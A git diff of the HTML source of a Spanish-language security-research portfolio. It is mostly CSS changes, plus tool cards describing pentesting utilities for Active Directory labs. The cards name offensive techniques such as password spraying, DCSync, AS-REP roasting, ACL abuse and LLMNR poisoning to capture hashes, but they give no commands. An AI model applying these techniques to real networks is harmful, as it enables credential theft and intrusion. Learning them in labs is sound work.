@@ -1,10 +1,9 @@
 <!DOCTYPE html>
-
 <html lang="es">
 <head>
-<meta charset="UTF-8" />
+<meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>OJM · Security Research</title>
+<title>OJM.SEC — Oriol Jaen Mirabet · Security Research</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
 <style>
@@ -26,36 +25,127 @@ body { background: var(--bg); color: var(--text); font-family: var(--sans); min-
 
 /* ── NAV ── */
 nav {
-position: sticky; top: 0; z-index: 100;
-background: var(–bg); border-bottom: 1px solid var(–border);
-padding: 0 2rem; display: flex; align-items: center;
-justify-content: space-between; height: 56px;
+  position: sticky; top: 0; z-index: 100;
+  background: var(--bg); border-bottom: 1px solid var(--border);
+  padding: 0 2rem; display: flex; align-items: center;
+  justify-content: space-between; height: 56px;
 }
-.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; }
-.nav-logo span { color: var(–accent); }
-.nav-links { display: flex; gap: 2rem; }
+.nav-logo {
+  font-size: 1rem; font-weight: 800; letter-spacing: -0.02em;
+  text-decoration: none; color: var(--text);
+}
+.nav-logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 2rem; align-items: center; }
 .nav-links a {
-font-family: var(–mono); font-size: 0.75rem; color: var(–muted);
-text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s;
+  font-family: var(--mono); font-size: 0.75rem; color: var(--muted);
+  text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s;
 }
-.nav-links a:hover { color: var(–text); }
+.nav-links a:hover { color: var(--text); }
+.nav-cta {
+  font-family: var(--mono); font-size: 0.7rem; padding: 0.35rem 0.9rem;
+  border: 1px solid var(--border); color: var(--muted); text-decoration: none;
+  transition: all 0.15s; letter-spacing: 0.04em;
+}
+.nav-cta:hover { border-color: var(--text); color: var(--text); }
 
 /* ── HERO ── */
 header {
-max-width: 1100px; margin: 0 auto;
-padding: 5rem 2rem 3.5rem; border-bottom: 1px solid var(–border);
+  max-width: 1100px; margin: 0 auto;
+  padding: 5rem 2rem 4rem; border-bottom: 1px solid var(--border);
+  display: grid; grid-template-columns: 1fr 280px; gap: 4rem; align-items: start;
 }
+@media (max-width: 768px) { header { grid-template-columns: 1fr; } .hero-card { display: none; } }
+.hero-left {}
 .hero-label {
-font-family: var(–mono); font-size: 0.7rem; letter-spacing: 0.12em;
-color: var(–accent); text-transform: uppercase; margin-bottom: 1rem;
+  font-family: var(--mono); font-size: 0.7rem; letter-spacing: 0.12em;
+  color: var(--accent); text-transform: uppercase; margin-bottom: 1rem;
+  display: flex; align-items: center; gap: 0.6rem;
+}
+.hero-label::before {
+  content: ''; display: inline-block; width: 20px; height: 1px; background: var(--accent);
 }
 h1 {
-font-size: clamp(2.4rem, 5vw, 4rem); font-weight: 800;
-line-height: 1.08; letter-spacing: -0.03em; max-width: 700px;
+  font-size: clamp(2.4rem, 5vw, 4rem); font-weight: 800;
+  line-height: 1.06; letter-spacing: -0.03em; max-width: 620px; margin-bottom: 1.4rem;
 }
+h1 em { color: var(--accent); font-style: normal; }
 .hero-desc {
-margin-top: 1.2rem; font-family: var(–mono); font-size: 0.82rem;
-color: var(–muted); max-width: 520px; line-height: 1.8;
+  font-family: var(--mono); font-size: 0.82rem;
+  color: var(--muted); max-width: 500px; line-height: 1.85; margin-bottom: 2rem;
+}
+.hero-links { display: flex; gap: 0.8rem; flex-wrap: wrap; }
+.hero-link {
+  font-family: var(--mono); font-size: 0.7rem; padding: 0.5rem 1rem;
+  border: 1px solid var(--border); color: var(--muted); text-decoration: none;
+  transition: all 0.15s; letter-spacing: 0.04em; display: flex; align-items: center; gap: 0.4rem;
+}
+.hero-link:hover { border-color: var(--text); color: var(--text); }
+.hero-link.primary {
+  background: var(--text); color: var(--bg); border-color: var(--text);
+}
+.hero-link.primary:hover { background: var(--accent); border-color: var(--accent); }
+
+/* ── PROFILE CARD ── */
+.hero-card {
+  border: 1px solid var(--border); background: var(--surface);
+  padding: 1.8rem; position: relative; overflow: hidden;
+}
+.hero-card::before {
+  content: ''; position: absolute; top: 0; left: 0;
+  width: 100%; height: 3px; background: var(--accent);
+}
+.card-handle {
+  font-family: var(--mono); font-size: 0.78rem; font-weight: 500;
+  color: var(--accent); margin-bottom: 0.3rem;
+}
+.card-name {
+  font-size: 1.1rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem;
+}
+.card-stat-row {
+  display: flex; flex-direction: column; gap: 0.6rem;
+  padding: 1rem 0; border-top: 1px solid var(--border);
+}
+.card-stat {
+  display: flex; justify-content: space-between; align-items: center;
+}
+.card-stat-key {
+  font-family: var(--mono); font-size: 0.62rem; color: var(--muted);
+  letter-spacing: 0.06em; text-transform: uppercase;
+}
+.card-stat-val {
+  font-family: var(--mono); font-size: 0.72rem; font-weight: 500; color: var(--text);
+}
+.card-stat-val.green { color: #4a8a00; }
+.card-stat-val.blue { color: var(--accent2); }
+.card-tags {
+  display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1.2rem; padding-top: 1rem;
+  border-top: 1px solid var(--border);
+}
+.card-tag {
+  font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem;
+  border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em;
+}
+
+/* ── STATS BAR ── */
+.stats-bar {
+  max-width: 1100px; margin: 0 auto;
+  border-bottom: 1px solid var(--border);
+  display: grid; grid-template-columns: repeat(4, 1fr);
+}
+@media (max-width: 640px) { .stats-bar { grid-template-columns: repeat(2, 1fr); } }
+.stat-item {
+  padding: 1.8rem 2rem; border-right: 1px solid var(--border);
+  display: flex; flex-direction: column; gap: 0.3rem;
+}
+.stat-item:last-child { border-right: none; }
+.stat-num {
+  font-size: 2rem; font-weight: 800; letter-spacing: -0.04em; line-height: 1;
+  color: var(--text);
+}
+.stat-num span { color: var(--accent); }
+.stat-desc {
+  font-family: var(--mono); font-size: 0.65rem; color: var(--muted);
+  letter-spacing: 0.06em; text-transform: uppercase;
 }
 
 /* ── LAYOUT ── */
@@ -63,187 +153,295 @@ color: var(–muted); max-width: 520px; line-height: 1.8;
 
 /* ── SECTION HEADER ── */
 .section-header {
-display: flex; align-items: baseline; gap: 1.2rem; padding: 3rem 0 1.5rem;
+  display: flex; align-items: baseline; gap: 1.2rem; padding: 3.5rem 0 1.5rem;
 }
 .section-title {
-font-size: 0.68rem; font-family: var(–mono); letter-spacing: 0.12em;
-text-transform: uppercase; color: var(–muted);
+  font-size: 0.68rem; font-family: var(--mono); letter-spacing: 0.12em;
+  text-transform: uppercase; color: var(--muted); white-space: nowrap;
 }
-.section-line { flex: 1; height: 1px; background: var(–border); }
+.section-line { flex: 1; height: 1px; background: var(--border); }
 
 /* ── TOOLS GRID ── */
 .tools-grid {
-display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-gap: 1px; background: var(–border); border: 1px solid var(–border);
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr));
+  gap: 1px; background: var(--border); border: 1px solid var(--border);
 }
 .tool-card {
-background: var(–surface); padding: 2rem; cursor: pointer;
-transition: background 0.15s; position: relative; overflow: hidden;
+  background: var(--surface); padding: 1.8rem; cursor: pointer;
+  transition: background 0.15s; position: relative; overflow: hidden;
 }
 .tool-card::before {
-content: ‘’; position: absolute; top: 0; left: 0;
-width: 3px; height: 100%; background: var(–accent);
-transform: scaleY(0); transform-origin: bottom; transition: transform 0.2s ease;
+  content: ''; position: absolute; top: 0; left: 0;
+  width: 3px; height: 100%; background: var(--accent);
+  transform: scaleY(0); transform-origin: bottom; transition: transform 0.2s ease;
 }
 .tool-card:hover { background: #fdfcf8; }
 .tool-card:hover::before { transform: scaleY(1); }
 .tool-card-top {
-display: flex; justify-content: space-between;
-align-items: flex-start; margin-bottom: 1rem;
+  display: flex; justify-content: space-between;
+  align-items: flex-start; margin-bottom: 0.9rem;
 }
 .tool-name {
-font-family: var(–mono); font-size: 0.78rem; font-weight: 500;
-color: var(–accent); letter-spacing: 0.04em;
+  font-family: var(--mono); font-size: 0.78rem; font-weight: 500;
+  color: var(--accent); letter-spacing: 0.04em;
 }
 .tool-category {
-font-family: var(–mono); font-size: 0.62rem; color: var(–muted);
-background: var(–tag-bg); padding: 0.2rem 0.5rem; border-radius: 2px;
-letter-spacing: 0.05em;
+  font-family: var(--mono); font-size: 0.58rem; color: var(--muted);
+  background: var(--tag-bg); padding: 0.18rem 0.5rem;
+  letter-spacing: 0.05em;
 }
 .tool-title {
-font-size: 1.15rem; font-weight: 700; letter-spacing: -0.02em;
-margin-bottom: 0.6rem; line-height: 1.3;
+  font-size: 1.05rem; font-weight: 700; letter-spacing: -0.02em;
+  margin-bottom: 0.55rem; line-height: 1.3;
 }
-.tool-desc { font-family: var(–mono); font-size: 0.74rem; color: var(–muted); line-height: 1.7; }
-.tool-footer { margin-top: 1.4rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+.tool-desc {
+  font-family: var(--mono); font-size: 0.73rem; color: var(--muted); line-height: 1.75;
+}
+.tool-footer { margin-top: 1.2rem; display: flex; gap: 0.4rem; flex-wrap: wrap; }
 .tag {
-font-family: var(–mono); font-size: 0.6rem; padding: 0.18rem 0.5rem;
-border: 1px solid var(–border); border-radius: 2px; color: var(–muted);
-letter-spacing: 0.04em;
+  font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem;
+  border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em;
 }
 
 /* ── WRITEUP CARDS ── */
-.writeup-card {
-background: var(–surface); padding: 2rem;
-position: relative; overflow: hidden;
-text-decoration: none; color: inherit; display: block;
-transition: background 0.15s;
-border-bottom: 1px solid var(–border);
+.writeups-wrapper {
+  border: 1px solid var(--border); background: var(--border);
+  display: flex; flex-direction: column; gap: 1px;
 }
-.writeup-card:last-child { border-bottom: none; }
+.writeup-card {
+  background: var(--surface); padding: 2rem;
+  position: relative; overflow: hidden;
+  text-decoration: none; color: inherit; display: block;
+  transition: background 0.15s;
+}
 .writeup-card::before {
-content: ‘’; position: absolute; top: 0; left: 0;
-width: 3px; height: 100%; background: var(–accent);
-transform: scaleY(0); transform-origin: bottom; transition: transform 0.2s ease;
+  content: ''; position: absolute; top: 0; left: 0;
+  width: 3px; height: 100%; background: var(--accent);
+  transform: scaleY(0); transform-origin: bottom; transition: transform 0.2s ease;
 }
 .writeup-card:hover { background: #fdfcf8; }
 .writeup-card:hover::before { transform: scaleY(1); }
-.writeup-card-inner { display: flex; align-items: flex-start; justify-content: space-between; gap: 2rem; }
+.writeup-card-inner {
+  display: flex; align-items: flex-start; justify-content: space-between; gap: 2rem;
+}
 .writeup-card-body { flex: 1; }
 .writeup-card-arrow {
-font-family: var(–mono); font-size: 1.2rem; color: var(–muted);
-flex-shrink: 0; margin-top: 0.2rem; transition: transform 0.2s, color 0.2s;
+  font-family: var(--mono); font-size: 1.2rem; color: var(--muted);
+  flex-shrink: 0; margin-top: 0.2rem; transition: transform 0.2s, color 0.2s;
 }
-.writeup-card:hover .writeup-card-arrow { transform: translateX(4px); color: var(–accent); }
-.writeups-wrapper {
-border: 1px solid var(–border); background: var(–border);
-display: flex; flex-direction: column; gap: 1px;
+.writeup-card:hover .writeup-card-arrow { transform: translateX(4px); color: var(--accent); }
+.writeup-meta {
+  display: flex; gap: 0.6rem; align-items: center; margin-bottom: 0.8rem; flex-wrap: wrap;
 }
+.writeup-badge {
+  font-family: var(--mono); font-size: 0.58rem; letter-spacing: 0.08em;
+  text-transform: uppercase; padding: 0.2rem 0.6rem; border: 1px solid var(--border);
+  color: var(--muted);
+}
+.writeup-badge.htb { border-color: #9fef00; color: #4a7a00; background: #f6fff0; }
+.writeup-badge.thm { border-color: #e42c2c; color: #b31c1c; background: #fff5f5; }
+.writeup-date {
+  font-family: var(--mono); font-size: 0.6rem; color: var(--muted); letter-spacing: 0.06em;
+}
+.writeup-title {
+  font-size: 1.25rem; font-weight: 800; letter-spacing: -0.02em;
+  margin-bottom: 0.5rem; line-height: 1.25;
+}
+.writeup-subtitle {
+  font-family: var(--mono); font-size: 0.73rem; color: var(--muted); margin-bottom: 1rem; line-height: 1.6;
+}
+.writeup-findings {
+  display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap;
+}
+.finding-pill {
+  font-family: var(--mono); font-size: 0.62rem; padding: 0.2rem 0.6rem;
+  letter-spacing: 0.04em;
+}
+.pill-critical { background: #fee2e2; color: #7f1d1d; }
+.pill-high { background: #fee2e2; color: #991b1b; }
+.pill-med { background: #fef3c7; color: #92400e; }
+.pill-info { background: #e0f2fe; color: #0c4a6e; }
 
 /* ── MODAL ── */
 .modal-overlay {
-display: none; position: fixed; inset: 0;
-background: rgba(26,25,23,0.6); z-index: 200;
-backdrop-filter: blur(3px); overflow-y: auto; padding: 2rem 1rem;
+  display: none; position: fixed; inset: 0;
+  background: rgba(26,25,23,0.65); z-index: 200;
+  backdrop-filter: blur(4px); overflow-y: auto; padding: 2rem 1rem;
+  align-items: flex-start; justify-content: center;
 }
-.modal-overlay.open { display: flex; justify-content: center; align-items: flex-start; }
+.modal-overlay.open { display: flex; }
 .modal {
-background: var(–surface); border: 1px solid var(–border);
-max-width: 740px; width: 100%; margin: auto; animation: slideUp 0.22s ease;
+  background: var(--surface); border: 1px solid var(--border);
+  max-width: 760px; width: 100%; margin: auto; animation: slideUp 0.2s ease;
 }
 @keyframes slideUp {
-from { opacity: 0; transform: translateY(20px); }
-to { opacity: 1; transform: translateY(0); }
+  from { opacity: 0; transform: translateY(16px); }
+  to   { opacity: 1; transform: translateY(0); }
 }
 .modal-header {
-padding: 2rem 2rem 1.5rem; border-bottom: 1px solid var(–border);
-display: flex; justify-content: space-between; align-items: flex-start;
+  padding: 2rem 2rem 1.5rem; border-bottom: 1px solid var(--border);
+  display: flex; justify-content: space-between; align-items: flex-start;
 }
 .modal-meta { display: flex; flex-direction: column; gap: 0.4rem; }
 .modal-label {
-font-family: var(–mono); font-size: 0.68rem;
-letter-spacing: 0.1em; color: var(–accent); text-transform: uppercase;
+  font-family: var(--mono); font-size: 0.65rem;
+  letter-spacing: 0.1em; color: var(--accent); text-transform: uppercase;
 }
-.modal-title { font-size: 1.7rem; font-weight: 800; letter-spacing: -0.03em; }
+.modal-title { font-size: 1.8rem; font-weight: 800; letter-spacing: -0.03em; }
 .modal-close {
-background: none; border: 1px solid var(–border); width: 36px; height: 36px;
-cursor: pointer; font-size: 1.1rem; color: var(–muted);
-display: flex; align-items: center; justify-content: center;
-transition: all 0.15s; flex-shrink: 0;
+  background: none; border: 1px solid var(--border); width: 36px; height: 36px;
+  cursor: pointer; font-size: 1.1rem; color: var(--muted);
+  display: flex; align-items: center; justify-content: center;
+  transition: all 0.15s; flex-shrink: 0;
 }
-.modal-close:hover { background: var(–text); color: var(–surface); border-color: var(–text); }
+.modal-close:hover { background: var(--text); color: var(--surface); border-color: var(--text); }
 .modal-body { padding: 2rem; }
 .modal-body h3 {
-font-size: 0.68rem; font-family: var(–mono); letter-spacing: 0.1em;
-text-transform: uppercase; color: var(–muted);
-margin: 1.8rem 0 0.7rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(–border);
+  font-size: 0.65rem; font-family: var(--mono); letter-spacing: 0.1em;
+  text-transform: uppercase; color: var(--muted);
+  margin: 1.8rem 0 0.7rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border);
 }
 .modal-body h3:first-child { margin-top: 0; }
-.modal-body p { font-family: var(–mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; }
-.modal-body ul { list-style: none; padding: 0; }
+.modal-body p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.6rem; }
+.modal-body ul { list-style: none; padding: 0; margin-bottom: 0.6rem; }
 .modal-body ul li {
-font-family: var(–mono); font-size: 0.76rem; line-height: 1.8;
-color: #3d3b36; padding-left: 1.2rem; position: relative;
+  font-family: var(--mono); font-size: 0.76rem; line-height: 1.8;
+  color: #3d3b36; padding-left: 1.2rem; position: relative;
 }
 .modal-body ul li::before {
-content: ‘→’; position: absolute; left: 0;
-color: var(–accent); font-size: 0.65rem; top: 0.05rem;
+  content: '→'; position: absolute; left: 0;
+  color: var(--accent); font-size: 0.65rem; top: 0.05rem;
 }
 pre {
-background: #1a1917; color: #e8e4d9; font-family: var(–mono);
-font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0;
-overflow-x: auto; line-height: 1.8; border-left: 3px solid var(–accent);
+  background: #1a1917; color: #e8e4d9; font-family: var(--mono);
+  font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0;
+  overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent);
 }
 .cmd-comment { color: #6b7280; }
 .cmd-flag { color: #60a5fa; }
 .cmd-value { color: #34d399; }
 .cmd-tool { color: #f87171; }
 .modal-tags {
-display: flex; gap: 0.5rem; flex-wrap: wrap;
-margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(–border);
+  display: flex; gap: 0.5rem; flex-wrap: wrap;
+  margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border);
 }
 .writeup-ref {
-margin-top: 1.5rem; padding: 1rem 1.2rem; background: var(–tag-bg);
-border-left: 3px solid var(–accent2); font-family: var(–mono);
-font-size: 0.72rem; color: var(–muted); line-height: 1.7;
+  margin-top: 1.5rem; padding: 1rem 1.2rem; background: var(--tag-bg);
+  border-left: 3px solid var(--accent2); font-family: var(--mono);
+  font-size: 0.72rem; color: var(--muted); line-height: 1.7;
 }
-.writeup-ref strong { color: var(–text); }
+.writeup-ref strong { color: var(--text); }
 
 /* ── FOOTER ── */
 footer {
-border-top: 1px solid var(–border); padding: 2rem; text-align: center;
-font-family: var(–mono); font-size: 0.68rem; color: var(–muted); letter-spacing: 0.06em;
+  border-top: 1px solid var(--border); padding: 2rem;
+  font-family: var(--mono); font-size: 0.68rem; color: var(--muted);
+  letter-spacing: 0.06em; display: flex; justify-content: space-between;
+  align-items: center; flex-wrap: wrap; gap: 1rem;
 }
+footer a { color: var(--muted); text-decoration: none; }
+footer a:hover { color: var(--text); }
+
 @media (max-width: 640px) {
-.tools-grid { grid-template-columns: 1fr; }
-h1 { font-size: 2rem; }
-.modal-title { font-size: 1.3rem; }
-.writeup-card-inner { flex-direction: column; }
+  .tools-grid { grid-template-columns: 1fr; }
+  h1 { font-size: 2rem; }
+  .modal-title { font-size: 1.3rem; }
+  .writeup-card-inner { flex-direction: column; }
+  .stats-bar { grid-template-columns: repeat(2,1fr); }
 }
 </style>
-
 </head>
 <body>
 
+<!-- NAV -->
 <nav>
-  <div class="nav-logo">OJM<span>.</span>SEC</div>
+  <a class="nav-logo" href="#">OJM<span>.</span>SEC</a>
   <div class="nav-links">
+    <a href="#about">ABOUT</a>
     <a href="#tools">TOOLS</a>
     <a href="#writeups">WRITEUPS</a>
+    <a class="nav-cta" href="https://github.com/ojamirabet" target="_blank">GitHub ↗</a>
   </div>
 </nav>
 
-<header>
-  <p class="hero-label">Security Research · Penetration Testing</p>
-  <h1>Writeups &<br>Tool Reference</h1>
-  <p class="hero-desc">
-    Documentación de herramientas y técnicas usadas en labs de hacking ético.<br>
-    Red team · Active Directory · Privilege Escalation
-  </p>
+<!-- HERO -->
+<header id="about">
+  <div class="hero-left">
+    <p class="hero-label">Security Research · Penetration Testing</p>
+    <h1>Red Team<br>Techniques &<br><em>AD Writeups</em></h1>
+    <p class="hero-desc">
+      Documentación de herramientas, técnicas y cadenas de ataque en entornos
+      Windows / Active Directory.<br><br>
+      Estudiante de Máster en Ciberseguridad (Monlau · CETI) · CPTS en progreso ·
+      Pentesting labs en HackTheBox y TryHackMe.
+    </p>
+    <div class="hero-links">
+      <a class="hero-link primary" href="#writeups">Ver writeups →</a>
+      <a class="hero-link" href="https://app.hackthebox.com/profile/ojamirabet" target="_blank">HTB Profile ↗</a>
+      <a class="hero-link" href="https://github.com/ojamirabet" target="_blank">GitHub ↗</a>
+    </div>
+  </div>
+
+  <div class="hero-card">
+    <div class="card-handle">OJM.SEC</div>
+    <div class="card-name">Oriol Jaen Mirabet</div>
+    <div class="card-stat-row">
+      <div class="card-stat">
+        <span class="card-stat-key">HTB Rank</span>
+        <span class="card-stat-val green">Hacker · ~#950</span>
+      </div>
+      <div class="card-stat">
+        <span class="card-stat-key">Cert en progreso</span>
+        <span class="card-stat-val blue">HTB CPTS</span>
+      </div>
+      <div class="card-stat">
+        <span class="card-stat-key">Formación</span>
+        <span class="card-stat-val">Máster Ciberseguridad</span>
+      </div>
+      <div class="card-stat">
+        <span class="card-stat-key">Foco</span>
+        <span class="card-stat-val">Red Team · AD · Pentest</span>
+      </div>
+      <div class="card-stat">
+        <span class="card-stat-key">Plataformas</span>
+        <span class="card-stat-val">HTB · TryHackMe</span>
+      </div>
+    </div>
+    <div class="card-tags">
+      <span class="card-tag">Active Directory</span>
+      <span class="card-tag">MSSQL</span>
+      <span class="card-tag">.NET RE</span>
+      <span class="card-tag">Kerberos</span>
+      <span class="card-tag">WCF</span>
+      <span class="card-tag">DCSync</span>
+    </div>
+  </div>
 </header>
 
+<!-- STATS BAR -->
+<div class="stats-bar">
+  <div class="stat-item">
+    <div class="stat-num">2<span>+</span></div>
+    <div class="stat-desc">Writeups publicados</div>
+  </div>
+  <div class="stat-item">
+    <div class="stat-num">9</div>
+    <div class="stat-desc">Tools documentadas</div>
+  </div>
+  <div class="stat-item">
+    <div class="stat-num">5</div>
+    <div class="stat-desc">High findings (Overwatch)</div>
+  </div>
+  <div class="stat-item">
+    <div class="stat-num"><span>#</span>950</div>
+    <div class="stat-desc">Global HTB ranking</div>
+  </div>
+</div>
+
+<!-- PAGE -->
 <div class="page">
 
+  <!-- TOOLS SECTION -->
   <div class="section-header" id="tools">
     <span class="section-title">Herramientas // Red Team & Active Directory</span>
     <div class="section-line"></div>
@@ -251,148 +449,126 @@ h1 { font-size: 2rem; }
 
   <div class="tools-grid">
 
-```
-<div class="tool-card" onclick="openModal('nmap')">
-  <div class="tool-card-top">
-    <span class="tool-name">nmap</span>
-    <span class="tool-category">RECON</span>
-  </div>
-  <div class="tool-title">Network Scanner & Port Discovery</div>
-  <p class="tool-desc">El escáner de red más usado en pentesting. Detecta puertos abiertos, versiones de servicios, sistemas operativos y ejecuta scripts NSE de enumeración.</p>
-  <div class="tool-footer">
-    <span class="tag">Port Scanning</span>
-    <span class="tag">Service Detection</span>
-    <span class="tag">OS Fingerprint</span>
-    <span class="tag">NSE Scripts</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('nmap')">
+      <div class="tool-card-top">
+        <span class="tool-name">nmap</span>
+        <span class="tool-category">RECON</span>
+      </div>
+      <div class="tool-title">Network Scanner & Port Discovery</div>
+      <p class="tool-desc">El escáner de red estándar en pentesting. Detecta puertos abiertos, versiones de servicios, OS y ejecuta scripts NSE para enumeración avanzada.</p>
+      <div class="tool-footer">
+        <span class="tag">Port Scanning</span><span class="tag">Service Detection</span>
+        <span class="tag">NSE Scripts</span><span class="tag">OS Fingerprint</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('kerbrute')">
-  <div class="tool-card-top">
-    <span class="tool-name">kerbrute</span>
-    <span class="tool-category">RECON</span>
-  </div>
-  <div class="tool-title">Kerberos User Enumeration & Spray</div>
-  <p class="tool-desc">Enumera usuarios de dominio válidos a través del protocolo Kerberos sin autenticación previa. También permite password spraying sigiloso contra AD.</p>
-  <div class="tool-footer">
-    <span class="tag">Active Directory</span>
-    <span class="tag">Kerberos</span>
-    <span class="tag">User Enum</span>
-    <span class="tag">Password Spray</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('kerbrute')">
+      <div class="tool-card-top">
+        <span class="tool-name">kerbrute</span>
+        <span class="tool-category">RECON · AD</span>
+      </div>
+      <div class="tool-title">Kerberos User Enumeration & Spray</div>
+      <p class="tool-desc">Enumera usuarios de dominio válidos vía Kerberos sin autenticación previa, aprovechando la respuesta diferencial del KDC ante usuarios válidos e inválidos.</p>
+      <div class="tool-footer">
+        <span class="tag">Active Directory</span><span class="tag">Kerberos</span>
+        <span class="tag">User Enum</span><span class="tag">No Auth Required</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('smbclient')">
-  <div class="tool-card-top">
-    <span class="tool-name">smbclient</span>
-    <span class="tool-category">ENUMERATION</span>
-  </div>
-  <div class="tool-title">SMB Share Enumeration & Access</div>
-  <p class="tool-desc">Cliente SMB de línea de comandos para listar y acceder a recursos compartidos de red Windows. Permite acceso anónimo, autenticado y transferencia de ficheros.</p>
-  <div class="tool-footer">
-    <span class="tag">SMB</span>
-    <span class="tag">File Access</span>
-    <span class="tag">Anonymous</span>
-    <span class="tag">Lateral Movement</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('smbclient')">
+      <div class="tool-card-top">
+        <span class="tool-name">smbclient</span>
+        <span class="tool-category">ENUMERATION</span>
+      </div>
+      <div class="tool-title">SMB Share Enumeration & File Access</div>
+      <p class="tool-desc">Cliente SMB de línea de comandos para listar y acceder a recursos compartidos. Permite sesiones nulas (null session), acceso autenticado y transferencia de ficheros.</p>
+      <div class="tool-footer">
+        <span class="tag">SMB</span><span class="tag">Null Session</span>
+        <span class="tag">File Transfer</span><span class="tag">Share Enum</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('dnspy')">
-  <div class="tool-card-top">
-    <span class="tool-name">dnSpy</span>
-    <span class="tool-category">REVERSE ENGINEERING</span>
-  </div>
-  <div class="tool-title">.NET Decompiler & Debugger</div>
-  <p class="tool-desc">Descompilador y depurador para binarios .NET y Unity. Permite leer código fuente de ejecutables compilados, editar IL en caliente y extraer secretos hardcodeados.</p>
-  <div class="tool-footer">
-    <span class="tag">.NET</span>
-    <span class="tag">Reverse Engineering</span>
-    <span class="tag">Credential Extraction</span>
-    <span class="tag">IL Editing</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('dnspy')">
+      <div class="tool-card-top">
+        <span class="tool-name">dnSpy</span>
+        <span class="tool-category">REVERSE ENGINEERING</span>
+      </div>
+      <div class="tool-title">.NET Decompiler & Debugger</div>
+      <p class="tool-desc">Descompilador y depurador para binarios .NET. Permite leer código fuente de ejecutables compilados, editar IL en caliente y extraer credenciales hardcodeadas.</p>
+      <div class="tool-footer">
+        <span class="tag">.NET</span><span class="tag">C# Decompilation</span>
+        <span class="tag">Credential Extraction</span><span class="tag">IL Editing</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('impacket')">
-  <div class="tool-card-top">
-    <span class="tool-name">impacket</span>
-    <span class="tool-category">EXPLOITATION</span>
-  </div>
-  <div class="tool-title">Windows Protocol Attack Suite</div>
-  <p class="tool-desc">Colección de scripts Python para atacar protocolos Windows: SMB, MSRPC, NTLM, Kerberos, LDAP, MSSQL. La navaja suiza del pentesting en entornos AD.</p>
-  <div class="tool-footer">
-    <span class="tag">AS-REP Roasting</span>
-    <span class="tag">DCSync</span>
-    <span class="tag">NTDS.dit</span>
-    <span class="tag">Pass-the-Hash</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('impacket')">
+      <div class="tool-card-top">
+        <span class="tool-name">impacket</span>
+        <span class="tool-category">EXPLOITATION · AD</span>
+      </div>
+      <div class="tool-title">Windows Protocol Attack Suite</div>
+      <p class="tool-desc">Colección de scripts Python para atacar protocolos Windows: SMB, MSRPC, NTLM, Kerberos, LDAP, MSSQL. Incluye mssqlclient, secretsdump, GetNPUsers y más.</p>
+      <div class="tool-footer">
+        <span class="tag">AS-REP Roasting</span><span class="tag">DCSync</span>
+        <span class="tag">NTDS.dit</span><span class="tag">MSSQL</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('bloodyad')">
-  <div class="tool-card-top">
-    <span class="tool-name">BloodyAD</span>
-    <span class="tool-category">AD ATTACKS</span>
-  </div>
-  <div class="tool-title">Active Directory Privilege Escalation</div>
-  <p class="tool-desc">Framework para auditar y abusar de permisos en Active Directory. Permite leer/escribir atributos AD, inyectar registros DNS, modificar ACLs y escalar privilegios sin Bloodhound.</p>
-  <div class="tool-footer">
-    <span class="tag">ACL Abuse</span>
-    <span class="tag">DNS Injection</span>
-    <span class="tag">AD Permissions</span>
-    <span class="tag">Privilege Escalation</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('bloodyad')">
+      <div class="tool-card-top">
+        <span class="tool-name">BloodyAD</span>
+        <span class="tool-category">AD ATTACKS</span>
+      </div>
+      <div class="tool-title">AD Privilege Escalation & ACL Abuse</div>
+      <p class="tool-desc">Framework para auditar y abusar permisos en Active Directory. Permite leer/escribir atributos, inyectar registros DNS, modificar ACLs y detectar rutas de escalada.</p>
+      <div class="tool-footer">
+        <span class="tag">ACL Abuse</span><span class="tag">DNS Injection</span>
+        <span class="tag">ADIDNS</span><span class="tag">Privilege Escalation</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('responder')">
-  <div class="tool-card-top">
-    <span class="tool-name">Responder</span>
-    <span class="tool-category">CREDENTIAL CAPTURE</span>
-  </div>
-  <div class="tool-title">LLMNR/NBT-NS/MSSQL Credential Capture</div>
-  <p class="tool-desc">Envenenador de protocolos de resolución de nombres (LLMNR, NBT-NS, mDNS) y servidor MSSQL/FTP/HTTP falso para capturar hashes NTLMv2 y credenciales en claro.</p>
-  <div class="tool-footer">
-    <span class="tag">LLMNR Poisoning</span>
-    <span class="tag">NTLMv2 Capture</span>
